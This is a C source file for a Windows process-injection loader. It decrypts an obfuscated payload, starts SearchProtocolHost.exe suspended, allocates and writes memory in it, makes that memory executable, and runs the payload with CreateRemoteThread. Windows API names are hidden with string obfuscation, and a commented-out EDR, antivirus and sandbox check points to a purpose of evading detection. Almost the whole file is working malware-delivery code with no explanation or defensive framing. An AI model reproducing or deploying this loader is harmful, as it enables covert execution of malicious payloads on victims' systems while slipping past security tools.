#include <windows.h>
#include "detector.h"
#include "evasion.h"
#include "payload.h"

// Core Injection Logic
void StealthExec(HANDLE hProc)
{
    PVOID memLoc = NULL;
    SIZE_T sz = payload_size + 1;
    HANDLE hThreadRemote;
    NTSTATUS status;

    obfs_decode_binary(DECKEY, payload, payload_size);

    status = CustAVM(hProc, &memLoc, 0, &sz, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (status != 0)
    {
        myDebug(DEBUG_ERROR, "NtAllocateVirtualMemory failed! Status: 0x%lX", status);
        return;
    }

    if (memLoc == NULL)
    {
        myDebug(DEBUG_ERROR, "Memory allocation failed, BaseAddress is NULL.");
        return;
    }
    else
    {
        myDebug(DEBUG_SUCCESS, "Successfully allocate memory.");
    }

    // Write DLL Path to Remote Process
    status = CustWVM(hProc, memLoc, (PVOID)payload, (ULONG)sz, NULL);
    if (status != 0)
    {
        myDebug(DEBUG_ERROR, "Memory write failed (Err: 0x%lX).", status);
        return;
    }
    else
    {
        myDebug(DEBUG_SUCCESS, "Successfully write memory.");
    }
    
    // Change Page Protection
    ULONG oldProtect;
    //status = CustPVM(hProc, &memLoc, &sz, (ULONG)0x40 , &oldProtect);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PNtProtectVirtualMemory myNtProtect =  (PNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    
    if (!myNtProtect) {
        myDebug(DEBUG_ERROR,"Failed to locate NtProtectVirtualMemory.\n");
        return;
    }
    status = myNtProtect(hProc, &memLoc, &sz, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != 0)
    {
        myDebug(DEBUG_ERROR, "Protect Memory change failed (Err: 0x%lX).", status);
        return;
    }
    else
    {
        myDebug(DEBUG_SUCCESS, "Successfully Protect Memory change.");
    }

    pMod pCRT = GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CreateRemoteThread"));

    if (!pCRT)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve CreateRemoteThread.");
        return;
    }
    else
    {
        myDebug(DEBUG_SUCCESS, "Successfully resolve CreateRemoteThread.");
    }

    // Load Remote DLL
    hThreadRemote = ((pCRT_t)pCRT)(hProc, NULL, 0, memLoc, NULL, 0, NULL);

    if (!hThreadRemote)
    {
        myDebug(DEBUG_ERROR, "Thread creation failed.");
        return;
    }
    else
    {
        myDebug(DEBUG_INFO, "Thread creation succeed. Waiting 5 sec for thread to resume");
        pWaitForSingleObject_t pWaitForSingleObject = (pWaitForSingleObject_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]WaitForSingleObject"));
        DWORD waitResult = pWaitForSingleObject(hThreadRemote, (LPDWORD)5000); // Wait for 5 seconds
        pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));
        if ((waitResult == WAIT_TIMEOUT) || (waitResult == WAIT_FAILED))
        {
            myDebug(DEBUG_ERROR, "WaitForSingleObject failed!");
            pTerminateThread_t pTerminateThread = (pTerminateThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]TerminateThread"));
            pTerminateThread(hThreadRemote, 0); // Kill stuck thread
            pCloseHandle(hThreadRemote);
            return;
        }
        pResumeThread_t pResumeThread = (pResumeThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]ResumeThread"));
        pResumeThread(hThreadRemote);
        pCloseHandle(hThreadRemote);
        myDebug(DEBUG_SUCCESS, "Successfully injected module via RemoteThread");
    }
    return;
}

// Entry Function
int main(int argc, char *argv[])
{
    // Check For EDR/AV/Sandbox env
    // if (PerfomChecksEnv())
    // {
    //     SortNumbers();
    //     return 0;
    // }

    STARTUPINFOA sInfo = {0};
    PROCESS_INFORMATION pInfo = {0};

    char *procPath = "[OBFS_ENC]C:\\Windows\\System32\\SearchProtocolHost.exe";
    #if DEBUG
        char *procName = "[OBFS_ENC]SearchProtocolHost.exe";
    #endif

    // Resolve CreateProcessA dynamically
    pCPA_t pCPA = (pCPA_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CreateProcessA"));

    if (!pCPA) {
        myDebug(DEBUG_ERROR, "Failed to resolve CreateProcessA");
        return -1;
    }

    if (!pCPA(obfs_decode(DECKEY, procPath), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
    {
        myDebug(DEBUG_ERROR, "Could not create %s.", procName);
        return -1;
    }

    myDebug(DEBUG_INFO, "Suspended %s created.", obfs_decode(DECKEY, procName));

    // Perform Injection
    StealthExec(pInfo.hProcess);

    // Resume Execution
    // pResumeThread_t pResumeThread = (pResumeThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]ResumeThread"));
    // pResumeThread(pInfo.hThread);
    // pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));
    // pCloseHandle(pInfo.hProcess);
    // pCloseHandle(pInfo.hThread);
    myDebug(DEBUG_INFO, "%s is now running.", obfs_decode(DECKEY, procName));

    return 0;
}